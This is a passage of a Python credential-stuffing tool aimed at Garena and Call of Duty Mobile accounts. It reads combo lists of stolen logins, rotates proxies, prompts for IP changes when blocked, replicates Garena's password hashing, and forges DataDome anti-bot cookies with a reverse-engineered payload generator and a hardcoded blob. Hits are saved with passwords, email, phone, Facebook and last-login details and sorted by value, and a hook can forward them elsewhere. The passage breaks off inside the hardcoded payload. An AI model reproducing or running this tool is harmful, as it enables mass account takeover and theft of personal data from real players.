        prog_color = self._C_ERROR if ip_blocked else self._C_PRIMARY
        prog_color2 = self._C_ERROR if ip_blocked else self._C_VIOLET

        d = {
            'done': done, 'total': total, 'valid': valid, 'invalid': invalid,
            'clean': clean, 'not_clean': not_clean, 'codm_p': codm_p, 'no_codm': no_codm,
            'l1': l1, 'l2': l2, 'l3': l3, 'l4': l4, 'hs': hs, 'hc': hc, 'nc_peak': nc_peak,
            'pct': pct, 'rate': rate, 'eta_str': eta_str,
            'ip_blocked': ip_blocked, 'cooldown_left': cooldown_left,
            'active': active, 'max_thr': max_thr, 'ramp_mode': ramp_mode,
            'proxy_display': proxy_display, 'proxy_line_num': proxy_line_num,
            'proxy_count': proxy_count, 'scan_mode': scan_mode,
            'high_hits': high_hits, 'recent': recent, 'elapsed_str': self._format_elapsed(elapsed),
            'prog_color': prog_color, 'prog_color2': prog_color2,
        }

        return Group(
            Text(""),
            self._render_header(d),
            Text(""),
            self._render_progress(d),
            Text(""),
            self._render_statistics_system(d),
            Text(""),
            self._render_levels(d),
            Text(""),
            self._render_top_hits(d),
            Text(""),
            self._render_live_feed(d),
            Text(""),
            Align.center(self._render_footer(d)),
            Text(""),
        )

    # ── Lifecycle ────────────────────────────────────────────────
    def start(self):
        self._stop_event.clear()
        self._live = Live(console=Console(), refresh_per_second=8, screen=True)
        self._live.start()
        self._render_thread = threading.Thread(target=self._render_loop, daemon=True)
        self._render_thread.start()

    def _render_loop(self):
        while not self._stop_event.is_set():
            if self._dirty:
                self._live.update(self._render())
                with self._lock:
                    self._dirty = False
            time.sleep(0.1)

    def stop(self):
        self._stop_event.set()
        if self._render_thread:
            self._render_thread.join(timeout=0.5)
        if self._live:
            self._live.stop()

    def render(self):
        return self._render()
    
class ResultsManager:
    def __init__(self, combo_file_path, create_dirs=True):
        self.combo_file_name = Path(combo_file_path).stem
        self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.base_dir = Path(f'Results/{self.combo_file_name}_{self.timestamp}')
        if create_dirs:
            for sub in ('Country', 'Level', 'Garena Shells'):
                (self.base_dir / sub).mkdir(parents=True, exist_ok=True)
            if CHECK_OTHER_GAMES:
                (self.base_dir / 'Games').mkdir(parents=True, exist_ok=True)
        self._file_locks = {}
        self._locks_meta = threading.Lock()
        self._counter = 0
        self._counter_lock = threading.Lock()

    def _get_flock(self, fp):
        fp = str(fp)
        with self._locks_meta:
            if fp not in self._file_locks:
                self._file_locks[fp] = threading.Lock()
            return self._file_locks[fp]

    def _next_index(self):
        with self._counter_lock:
            self._counter += 1
            return self._counter

    @staticmethod
    def _entry_level(entry):
        m = _RE_LEVEL.search(entry)
        return int(m.group(1)) if m else 0

    @staticmethod
    def _entry_shell(entry):
        m = _RE_SHELL.search(entry)
        return int(m.group(1)) if m else 0

    def _write_sorted(self, filepath, new_entry_body, sort_by='level'):
        """Append-only to prevent O(n^2) rewrites during scanning."""
        filepath = str(filepath)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        
        # Strip leading/trailing '=' to avoid double separators
        new_entry = new_entry_body.strip()
        sep = '=' * 60
        if new_entry.startswith(sep):
            new_entry = new_entry[len(sep):].strip()
        if new_entry.endswith(sep):
            new_entry = new_entry[:-len(sep)].strip()
            
        with self._get_flock(filepath):
            with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                f.write(sep + '\n')
                f.write(new_entry)
                f.write('\n' + sep + '\n\n')

    def finalize_sort(self, filepath, sort_by='level'):
        """Called ONCE at end of session to sort the appended files."""
        filepath = str(filepath)
        if not os.path.exists(filepath): return
        sep = '=' * 60
        
        with self._get_flock(filepath):
            with open(filepath, 'r', encoding='utf-8', errors='replace') as f:
                content = f.read()
            
            # Parse all entries, stripping separators
            entries = []
            raw_entries = content.split(sep)
            for raw in raw_entries:
                raw = raw.strip()
                if raw:
                    entries.append(raw)
            
            if not entries: return
            
            if sort_by == 'shell':
                entries.sort(key=self._entry_shell, reverse=True)
            else:
                entries.sort(key=self._entry_level, reverse=True)
                
            # Rewrite file cleanly
            with open(filepath, 'w', encoding='utf-8', errors='replace') as f:
                for i, entry in enumerate(entries):
                    f.write(sep + '\n')
                    f.write(entry.strip())
                    f.write('\n' + sep)
                    if i < len(entries) - 1:
                        f.write('\n\n')

    def _append_line(self, filepath, line):
        filepath = str(filepath)
        with self._get_flock(filepath):
            with open(filepath, 'a', encoding='utf-8', errors='replace') as f:
                f.write(line + '\n')

    @staticmethod
    def _ascii(val):
        if not val or val == 'N/A':
            return val
        cleaned = ''.join((c for c in str(val) if c >= ' ' or c in '\t')).strip()
        return cleaned or 'N/A'

    def _format_server(self, region_code):
        if not region_code or region_code == 'N/A':
            return 'N/A'
        _region_info = CODM_REGIONS.get(str(region_code).upper(), {}) if region_code and region_code != 'N/A' else {}
        return f"{_region_info['flag']} {_region_info['name']} ({region_code})" if _region_info else str(region_code)

    def _format_account(self, account_data, index=1):
        acct = account_data.get('account', 'N/A')
        pwd = account_data.get('password', 'N/A')
        if account_data.get('is_error'):
            return '=' * 60 + f"\nAccount: {acct} : {pwd}\nError: {account_data.get('error_reason', 'Unknown')}\n" + '=' * 60
        is_clean = account_data.get('is_clean', False)
        has_codm = account_data.get('has_codm', False)
        
        base_lines = [
            '=' * 60, f'Account: {acct} : {pwd}', f'UID: {account_data.get("uid", "N/A")}',
            f'Username: {self._ascii(account_data.get("username", "N/A"))}',
            f'Garena Shell: {account_data.get("shell_balance", 0)}',
            f'Email: {account_data.get("email_display", "N/A")}',
            f'Mobile: {account_data.get("formatted_mobile", "N/A")}',
            f'Country: {account_data.get("country", "N/A")}',
            f'Nickname: {self._ascii(account_data.get("nickname", "N/A"))}',
            '', '--- Facebook Information ---',
            f'Facebook Username: {self._ascii(account_data.get("fb_username", "N/A"))}',
            f'Facebook Link: {account_data.get("fb_link", "N/A")}',
            f'Facebook Status: {account_data.get("fb_info", "N/A")}',
            '', '--- Login History ---',
            f'Last Login: {account_data.get("last_login_date", "N/A")}',
            f'Last Login From: {account_data.get("last_login_where", "N/A")}',
            f'Last Login IP: {account_data.get("last_login_ip", "N/A")}',
            f'Last Login Country: {account_data.get("last_login_country", "N/A")}',
            '', f'Account Status: {("Clean" if is_clean else "Not Clean")}',
            '', 'Powered by: @LEGITCosmicDev x @LEGITCosmicDev2nd', '=' * 60
        ]
        
        if not has_codm:
            return '\n'.join(base_lines)
        
        codm_lines = [
            '--- CODM Information ---',
            f'Account Level: {account_data.get("codm_level", "N/A")}',
            f'Server: {self._format_server(account_data.get("codm_region", "N/A"))}',
            f'IGN: {self._ascii(account_data.get("codm_nickname", "N/A"))}',
            f'UID: {account_data.get("codm_uid", account_data.get("uid", "N/A"))}', ''
        ]
        
        login_index = base_lines.index('--- Login History ---')
        final_lines = base_lines[:login_index] + codm_lines + base_lines[login_index:]
        return '\n'.join(final_lines)

    def add_account(self, account_data):
        if _TG_HOOK and (not account_data.get('is_error')):
            threading.Thread(target=_TG_HOOK, args=(account_data,), daemon=True).start()
        if account_data.get('is_error'):
            return
        combo = f"{account_data.get('account', '')}:{account_data.get('password', '')}"
        entry = self._format_account(account_data, index=self._next_index())
        has_codm = account_data.get('has_codm', False)
        is_clean = account_data.get('is_clean', False)
        shell = int(account_data.get('shell_balance', 0) or 0)
        timestamp = self.timestamp
        
        self._write_sorted(self.base_dir / f'All_Accounts_{timestamp}.txt', entry)
        self._append_line(self.base_dir / f'Valid_Accounts_{timestamp}.txt', combo)
        
        if is_clean and has_codm:
            self._write_sorted(self.base_dir / f'Clean_Accounts_{timestamp}.txt', entry)
        elif has_codm:
            self._write_sorted(self.base_dir / f'Not_Clean_Accounts_{timestamp}.txt', entry)
        
        if not has_codm:
            self._write_sorted(self.base_dir / f'NO_CODM_Accounts_{timestamp}.txt', entry)
            if shell > 0:
                self._write_sorted(self.base_dir / 'Garena Shells' / f'NO_CODM_Shells_{timestamp}.txt', entry, sort_by='shell')
            return
        
        country = str(account_data.get('country', 'XX') or 'XX').strip().upper()
        self._write_sorted(self.base_dir / 'Country' / f'{country}_Accounts_{timestamp}.txt', entry)
        
        try:
            lvl = int(account_data.get('codm_level', 0) or 0)
        except (ValueError, TypeError):
            lvl = 0
        bucket = '1-100_{timestamp}.txt' if lvl <= 100 else '101-200_{timestamp}.txt' if lvl <= 200 else '201-350_{timestamp}.txt' if lvl <= 350 else '351-400_{timestamp}.txt'
        self._write_sorted(self.base_dir / 'Level' / bucket, entry)
        
        if shell > 0:
            self._write_sorted(self.base_dir / 'Garena Shells' / f'CODM_Shells_{timestamp}.txt', entry, sort_by='shell')
            
_SCRIPT_DIR_COOKIE = os.path.dirname(os.path.abspath(__file__))
_TG_HOOK = None



# ══════════════════════════════════════════════════════════════════════════
#  FAST SESSION — Connection pooling + keep-alive
# ══════════════════════════════════════════════════════════════════════════
def _fast_session():
    """Create a session optimized for speed."""
    s = requests.Session()

    # Connection pooling
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=50,      # 50 connection pools
        pool_maxsize=100,         # 100 connections per pool
        max_retries=0,            # We handle retries ourselves
        pool_block=False,         # Don't block when pool full
    )
    s.mount("http://", adapter)
    s.mount("https://", adapter)

    # Default headers to reduce per-request overhead
    s.headers.update({
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    })

    return s

class ProxyManager:
    """Smart proxy manager with health tracking and rotation."""

    def __init__(self, enabled=True, fallback_url=None, proxy_file="proxies.txt"):
        self.enabled = enabled
        self.proxies = []
        self._index = 0
        self._counter = 0
        self._lock = threading.Lock()

        # ── Health tracking ──────────────────────────────────
        # proxy_url → {'success': int, 'fail': int, 'last_used': float, 'cooldown_until': float}
        self.health = {}
        self._fail_threshold = 5       # Fail 5x → cooldown
        self._cooldown_seconds = 60    # 60s cooldown
        self._min_success_rate = 0.3   # Below 30% success → deprioritize

        if not enabled:
            return

        if fallback_url:
            self.proxies = [fallback_url]
        elif proxy_file and Path(proxy_file).exists():
            self._load_from_file(proxy_file)

        # Init health for all loaded proxies
        for p in self.proxies:
            self.health[p] = {
                'success': 0, 'fail': 0,
                'last_used': 0, 'cooldown_until': 0
            }

    def _load_from_file(self, proxy_file):
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                url = _parse_proxy_line(line)
                if url:
                    self.proxies.append(url)

    def _is_healthy(self, proxy):
        """Check if proxy is ready to use (not in cooldown)."""
        h = self.health.get(proxy, {})
        if time.time() < h.get('cooldown_until', 0):
            return False
        return True

    def _score(self, proxy):
        """Higher = better. Consider success rate + recency."""
        h = self.health.get(proxy, {})
        s = h.get('success', 0)
        f = h.get('fail', 0)
        total = s + f
        if total == 0:
            return 1.0  # untested — mid priority
        rate = s / total
        if rate < self._min_success_rate:
            return 0.1  # bad proxy
        return rate

    def get_next(self):
        """Get next healthy proxy sorted by score."""
        if not self.enabled or not self.proxies:
            return None

        with self._lock:
            now = time.time()
            # Filter healthy
            healthy = [p for p in self.proxies if self._is_healthy(p)]
            if not healthy:
                # All in cooldown — reset the oldest
                oldest = min(self.proxies, key=lambda p: self.health[p].get('cooldown_until', 0))
                self.health[oldest]['cooldown_until'] = 0
                self.health[oldest]['fail'] = 0  # reset
                healthy = [oldest]

            # Sort by score DESC, then random for tie-break
            healthy.sort(key=lambda p: (-self._score(p), random.random()))

            # Pick top with some randomness (top 5)
            pool = healthy[:max(1, min(5, len(healthy)))]
            proxy = random.choice(pool)

            self.health[proxy]['last_used'] = now
            self._index += 1
            self._counter += 1

        return {'http': proxy, 'https': proxy}

    def mark_success(self, proxy_url):
        """Call after successful request."""
        if not proxy_url:
            return
        with self._lock:
            if proxy_url in self.health:
                self.health[proxy_url]['success'] += 1

    def mark_fail(self, proxy_url):
        """Call after failed request. Auto-cooldown if too many fails."""
        if not proxy_url:
            return
        with self._lock:
            if proxy_url not in self.health:
                self.health[proxy_url] = {'success': 0, 'fail': 0, 'last_used': 0, 'cooldown_until': 0}
            self.health[proxy_url]['fail'] += 1
            # Auto-cooldown
            if self.health[proxy_url]['fail'] >= self._fail_threshold:
                self.health[proxy_url]['cooldown_until'] = time.time() + self._cooldown_seconds
                self.health[proxy_url]['fail'] = 0  # reset counter

    def is_loaded(self):
        return self.enabled and len(self.proxies) > 0

    def get_count(self):
        return len(self.proxies)

    def get_stats(self):
        """Get health stats."""
        with self._lock:
            healthy = sum(1 for p in self.proxies if self._is_healthy(p))
            total_success = sum(h.get('success', 0) for h in self.health.values())
            total_fail = sum(h.get('fail', 0) for h in self.health.values())
            return {
                'total': len(self.proxies),
                'healthy': healthy,
                'cooldown': len(self.proxies) - healthy,
                'success': total_success,
                'fail': total_fail,
            }

class CookieManager:

    def __init__(self):
        self.banned_cookies = set()
        self.live_cookies = deque()
        self.lock = threading.Lock()
        self.load_banned_cookies()
        self.load_initial_cookies()

    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set((line.strip() for line in f if line.strip()))

    def load_initial_cookies(self):
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                for line in f:
                    cookie = line.strip()
                    if cookie and cookie not in self.banned_cookies:
                        self.live_cookies.append(cookie)

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie_value):
        formatted_cookie = cookie_value if 'datadome=' in cookie_value else f'datadome={cookie_value}'
        with self.lock:
            if formatted_cookie in self.live_cookies:
                self.live_cookies.remove(formatted_cookie)
            if formatted_cookie not in self.banned_cookies:
                self.banned_cookies.add(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('banned_cookies.txt', formatted_cookie), daemon=True).start()

    def get_valid_cookies(self):
        with self.lock:
            cookies = list(self.live_cookies)
            if cookies:
                random.shuffle(cookies)
            return cookies

    def save_cookie(self, datadome_value):
        if not datadome_value:
            return False
        val = datadome_value.strip()
        formatted_cookie = val if val.startswith('datadome=') else f'datadome={val}'
        with self.lock:
            if formatted_cookie not in self.banned_cookies and formatted_cookie not in self.live_cookies:
                self.live_cookies.append(formatted_cookie)
                threading.Thread(target=self._append_to_file, args=('fresh_cookie.txt', formatted_cookie), daemon=True).start()
                return True
        return False

    def _append_to_file(self, filename, content):
        try:
            with open(filename, 'a') as f:
                f.write(content + '\n')
        except Exception:
            pass

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(';'):
        item = item.strip()
        if not item:
            continue
        if '=' in item:
            try:
                key, value = item.split('=', 1)
                cookie_dict[key.strip()] = value.strip()
            except ValueError:
                pass
    session.cookies.update(cookie_dict)

_ip_wait_lock = threading.Lock()
_ip_wait_active = False
_ip_wait_event = threading.Event()
_suppress_ip_prints = False
_ip_block_callback = None

def init_ga_cookies(session):
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    ga_cookies = {'_ga': f'GA1.1.{random_id}.{timestamp}', '_ga_XB5PSHEQB4': f'GS2.1.s{timestamp}$o1$g0$t{timestamp}$j53$l0$h0', '_ga_1M7M9L6VPX': f'GS2.1.s{timestamp}$o6$g0$t{timestamp}$j60$l0$h0'}
    for name, value in ga_cookies.items():
        session.cookies.set(name, value, domain='.garena.com')
    return ga_cookies

class DataDomeGenerator:

    def init(self, key: str, cookie: str):
        self.key = key
        self.cookie = cookie
        self.t = 9959949970
        self.n = 1789537805

    def _hash_str_to_int(self, s: str) -> int:
        if not s:
            return self.n
        o = 0
        for char in s:
            o = (o << 5) - o + ord(char) & 4294967295
        return o

    def _prng_h(self, n: int) -> int:
        n ^= n << 13
        n ^= n >> 17 & 4294967295
        n ^= n << 5
        return n & 4294967295

    def _create_keystream_generator(self, seed1: int, seed2: int):
        e = seed1
        i = -1
        r = seed2
        a = True
        u = None

        def generator(get_val: bool=False) -> int:
            nonlocal e, i, r, a, u
            if u is not None:
                t = u
                u = None
                return t
            i += 1
            if i > 2:
                e = self._prng_h(e)
                i = 0
            t = e >> 16 - 8 * i & 255
            if a:
                r -= 1
                t ^= r & 255
            if get_val:
                u = t
            return t
        a = False
        return generator

    def _custom_b64_encode_char(self, n: int) -> int:
        if 37 < n:
            return 59 + n
        if 11 < n:
            return 53 + n
        if 1 < n:
            return 46 + n
        return 50 * n + 45

    def generate_payload(self, data: dict[str, any], timestamp: int) -> str:
        seed_from_cookie = self._hash_str_to_int(self.cookie)
        initial_seed = self.t ^ seed_from_cookie ^ self._hash_str_to_int(self.key)
        e = self._prng_h(self._prng_h((timestamp >> 3 ^ 11027890091) * self.t))
        keystream_gen_a = self._create_keystream_generator(initial_seed, e)
        payload_bytes = []
        is_first = True

        def stringify(val: Any) -> str:
            return json.dumps(val)

        def encrypt_str(s: str) -> List[int]:
            buffer = s.encode('utf-8')
            encrypted = []
            for byte in buffer:
                encrypted.append(byte ^ keystream_gen_a())
            return encrypted
        for key, value in data.items():
            if not is_first:
                payload_bytes.append(keystream_gen_a() ^ 44)
            key_bytes = encrypt_str(stringify(key))
            value_bytes = encrypt_str(stringify(value))
            payload_bytes.extend(key_bytes)
            payload_bytes.append(keystream_gen_a() ^ 58)
            payload_bytes.extend(value_bytes)
            is_first = False
        keystream_gen_b = self._create_keystream_generator(1809053797 ^ self._hash_str_to_int(self.cookie), e)
        final_bytes = [byte ^ keystream_gen_b() for byte in payload_bytes]
        final_bytes.append(keystream_gen_a(True) ^ 125 ^ keystream_gen_b())
        result_chars = []
        w = 0
        b = e
        while w < len(final_bytes):
            b = b - 1 & 4294967295
            byte1 = b & 255 ^ final_bytes[w]
            w += 1
            b = b - 1 & 4294967295
            byte2 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            b = b - 1 & 4294967295
            byte3 = b & 255 ^ final_bytes[w] if w < len(final_bytes) else 0
            w += 1
            z = byte1 << 16 | byte2 << 8 | byte3
            result_chars.append(chr(self._custom_b64_encode_char(z >> 18 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 12 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z >> 6 & 63)))
            result_chars.append(chr(self._custom_b64_encode_char(z & 63)))
        padding = len(final_bytes) % 3
        if padding > 0:
            return ''.join(result_chars[:-(3 - padding)])
        return ''.join(result_chars)



# ══════════════════════════════════════════════════════════════════════════
#  FAST CACHE — avoid refetching DataDome cookies
# ══════════════════════════════════════════════════════════════════════════
_DD_CACHE = {}
_DD_CACHE_LOCK = threading.Lock()
_DD_CACHE_TTL = 300  # 5 minutes


def _cache_get_dd(session_key):
    with _DD_CACHE_LOCK:
        entry = _DD_CACHE.get(session_key)
        if entry and (time.time() - entry['ts']) < _DD_CACHE_TTL:
            return entry['value']
        return None


def _cache_set_dd(session_key, value):
    with _DD_CACHE_LOCK:
        _DD_CACHE[session_key] = {'value': value, 'ts': time.time()}
        # Cleanup old entries
        if len(_DD_CACHE) > 100:
            now = time.time()
            expired = [k for k, v in _DD_CACHE.items() if (now - v['ts']) > _DD_CACHE_TTL]
            for k in expired:
                del _DD_CACHE[k]

class DataDomeManager:

    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False

    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        for service in ip_services:
            try:
                response = requests.get(service, timeout=8)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                continue
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        global _ip_wait_lock, _ip_wait_active, _ip_wait_event
        with _ip_wait_lock:
            if _ip_wait_active:
                is_primary = False
            else:
                _ip_wait_active = True
                _ip_wait_event.clear()
                is_primary = True
        if not is_primary:
            _ip_wait_event.wait(timeout=max_wait_time + 30)
            return True
        try:
            original_ip = self.get_current_ip()
            if not original_ip:
                if not _suppress_ip_prints:
                    _log('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
                if _ip_block_callback:
                    _ip_block_callback(True)
                time.sleep(10)
                if _ip_block_callback:
                    _ip_block_callback(False)
                return True
            if not _suppress_ip_prints:
                _log('ERROR', f'IP BLOCKED — [bold]{original_ip}[/bold]')
                _log('WARNING', 'Change your IP now — VPN / Mobile Data / Airplane Mode')
            if _ip_block_callback:
                _ip_block_callback(True)
            start_time = time.time()
            if not _suppress_ip_prints:
                with Progress(SpinnerColumn(), TextColumn('[progress.description]{task.description}'), BarColumn(), TimeElapsedColumn(), console=console, transient=True) as progress:
                    task = progress.add_task('[yellow]Waiting for IP change…', total=max_wait_time)
                    while time.time() - start_time < max_wait_time:
                        time.sleep(check_interval)
                        progress.update(task, completed=time.time() - start_time)
                        current_ip = self.get_current_ip()
                        if current_ip and current_ip != original_ip:
                            _log('SUCCESS', f'IP changed: [dim]{original_ip}[/dim] → [bold bright_green]{current_ip}[/bold bright_green]')
                            if _ip_block_callback:
                                _ip_block_callback(False)
                            return True
                _log('ERROR', 'IP did not change within time limit')
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
            else:
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        if _ip_block_callback:
                            _ip_block_callback(False)
                        return True
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
        finally:
            with _ip_wait_lock:
                _ip_wait_active = False
            _ip_wait_event.set()

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                return True
            else:
                return False
        return False

def get_datadome_cookie(session, proxies=None):
    url = 'https://datadome.garena.com/js/'
    
    timestamp = int(time.time())
    random_id = random.randint(1000000000, 9999999999)
    
    headers = {
        'content-length': '6374',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-mobile': '?1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'accept': '*/*',
        'origin': 'https://sso.garena.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://sso.garena.com/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8',
        'cookie': f'_ga_1M7M9L6VPX=GS2.1.s{timestamp}$o21$g1$t{timestamp}$j53$l0$h0; _ga=GA1.1.{random_id}.{timestamp}'
    }
    
    payload = {
        'jspl': 'QGQ0BVgjckhG9XFf_olrvPEwB5AKErtjUd6f_dtbCw6uU4mUnl4Ca5uJY9K_OWQfTtT2EcX852pDG2IId4gG5U65OppS7iwx7RfQ1zzKRMro56Xwcuu9Q_K16c69frRlWlLQd-n0p6XgiRXwusJv0AzdM9tBXrKAChlwUPvgd1086UwD5VEdfQXn-_xJN7-6-7Fs2LBt0A7vW4CPF6iCHCIKFJHbFFo8uTxvSdJL69AHKqqrRJ8oQCkfO_GrZiTFCXZAbGwdCqzkFEGFeBGH0RVAG_q7wmiKlII3zlcqZcRgoP2awfU6RjhvIeJToH5rTrby8SGuCZXLAGCG2tcCxraVYDQEL63p5anIGBrdTwdGVE6yL8B4vXNXLTIO0iq0AWjCksq599tQ38RAgo0tMl6cix0pOUwpigTNKY-4eIEEaQ2Cn_Nr9eXTrqRWZOaszlStMIE8M73ErsI_6dLXI5tcohL1NA0k6dPyVhurkMtYjUodgDN0EluJufLMKvH_D6-JT9xIebqCZ2zPv2eOO5wcMC1TyHFjR3NGwpJvD-YghfQUxdmFd3Xcjc41Rcp21CZ2HVsFZME-B8ppZ7AyU3Mn-ETydYWauETEamzkZynKSMKQTys-SrbONsKCbmQiGUxDumBKsPR8ODY87U_QKs3icJeXPheiBv-0w40kMiBU7KLYOrH0wCcGPO4pWS5bl9ju2KF3nMwD5V5AajCqdotm-JU7qAZxJiPAtU9xZmqr-mDQELX56jokfmkqX8v_4YZeAdx0VU96Rpj_-qdvhKpzm9OYZeJI-4VVLhXN200cEumhRfyVp5HZ3pUdUYxgp0ryCydj31kG8dLTDCKTIhMtsUo3bSypcbsE-xdz-P-gUNUYXcTN7uuekhuKwNIeEcTcLdw6udGartLTkTt4SmWxncPDzKwLh6qdhdRVAJIhlbeFY_OeIF4TkCPbGEv9xlN3MJFZccX097QLDT9niyMzxACRar3aPJDzZlaoyyr0asFkNu65-Hfj_XLYlSYET7vC-Sqgzo5016flXcuzKZvMfJp9Jk78GRUtYtVPHEJzMdU0SMcKTp8joR8Y_mmyHIOnoGer4TatyOfNCRF8OJNdMwp3eSknYp_yfBSUa1jI3WPtX9lg5kl50YJgNQPovYyCJU_Dwjty_KirEFgbUoOT7yr7w5pJc7yBC2n3wfTxiwmp-RsBwZXlk19UYDiGwWTMA5EfglURLVraue7Df36AEQV5QqBVupNtGpZFwPC5K9YJDG5DIlIMNfIL4X8chGhxCMV6nem-otHDi9JUkcVbTttqrJyQ50FNfRwUt_ScqwsXVEBD26I-AD6xsdkqmCx60ehJMXiSywNE_Mjt9zG4TUoHKY95gpcXDSvcSVJ6W-rCAQ3M0vcgu5wcdEb1SXmBzUJf_rSJxZoFNPdZjgrQqVBByJKy2V7x4ywPpPPf83z0Y6B7gkW6RS7fUlT47SSjvtkXGYoRLn9zDcOtvX1TxxUXrDjw4H9T5n7zOy5Eao7BQ9fcDgZ1pyYH6soR9Ug2MsOX5cHCH5LMC7qZtDW0aFKLD76LNMcZfWxn_tiadU3JynnXwkZ8B70leGLWoe9azUJY0F_xgD6tgCKf1xxJQAtcuUU1PTHG_kIFhD_UrZiq4DKhIMZgvkSgwEvpYmHOnpRZMoqOn2T81bwz1jhDq3H0YJClW2y0Bzk_cvMEZOb05kS3cHr0fcVGnLkqxGWWsT9YVRbNueDhbZIoPfdiOpqn9ZTOpxKFxwEuEeKaPSfb6A7PUAHREieN9hpCdlmZwygPw3sHpK0jdD-hKUTjI3d-xOr2Tc9-QVtSy_mdR_rSdMDvXEJsVZJ33f6SaKsnsElaLd2vB8YZfUaTksujLUBqgxd4gSKUdcEZ-_-8huvk9MJFsw37KqHYVCCmdHzJe_KjC6GZx4UGskD1amFPKYTp7Q4H9U-RIflTDX3K8Pxced7Kx4W-7tDt8V5wj6ggRDK_wAZ_8fxpjrH7PhEyTTeJxB_bJ2Sigbjoi368mAoudRMkiChN66D8xap_nUUCtBkdFDZpThAv04leKOllua60DS5W1KL91x9CYMPmKQUWMHFVY6MqPaUsecHxDK1WujPkCnSGKpr0iiEHNpbC_5atdvXmS2dVjyih1fXxpnwW5-uyybBQKkhWXcI6HXC5ic6J4sBra17lvvBfff4sAw_FohvjPwNUCW4fUKz8qrLXYWuhTtsgzCdwXKnNbAJHFg5RPiAR3sDj6eIPJlRSv3foRh656t3015JAetowe7J2l7a_UBRmkQmZerVBEh8LCgU_BqE1Kz4ibHWHBPcBSRZVzCmfUXVUWWaYfAtBUIkz4n0TNDf3MjhksOpda2sKiJ97w7lZDPA_46hiFhfM6SP8y9GV7ToaXGxY-rsDGKxUXvCmk73l5YbxfaHfGhMpKxsSCaj40MFKyCNydU7Wn9Eha1bNW0CdenKkrTcJgpfgHkOKSjIFJMJzElcE1TWTYWxlqJqKHnMw9GmQFPeQ0iYSf_NWtU2AFv7cjqCeVY6EOWN6yNMPCpIKHapVzCpwSxVmdywJYwFpte2kcu0RDICFHL1_ocSPF83azDEAcyb2sK6hu5WBR9mB-KGKnBzkktfo7TSvrq05d6tQInG3jxnFULmdvyUhIf7Wh9PoO48psknM85XQ3gCMMUlqyBwT0csGaik-DLyFnoWo2bQW9vpPhmxO_wtQ6YBfQpIRsJlDexBaLWFX7KpWOr4wgX-0jviPLsXOGSWQ-e6PxflfbEO6hYdBL7uJhRO7QA8wsLvnUUxdLY7mxzCJF2_l_O2a_Sdw7MId_KjEerVYj0VHm9svX7RdrrnS2DzbXyXzRGOy8l6OzQoDUAQRfyV2mjZgpYPxQryG2G3P538x4zw-k_JNsy39rhjM0-uCTQ1d7YapQx3W20R3CxSPgk4tiu7sIK